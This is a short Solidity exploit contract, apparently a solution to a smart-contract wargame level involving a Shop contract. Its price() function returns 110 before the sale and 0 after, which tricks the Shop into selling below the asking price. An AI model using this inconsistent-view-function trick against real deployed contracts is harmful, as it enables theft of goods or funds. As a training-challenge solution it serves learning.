// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Level21.sol";

contract Attack {
    function price() external view returns (uint256) {
        Shop _instance = Shop(msg.sender);
        if (_instance.isSold()) {
            return 0;
        } else {
            return 110;
        }
    }

    function attackShop(Shop _instance) public {
        _instance.buy();
    }
}
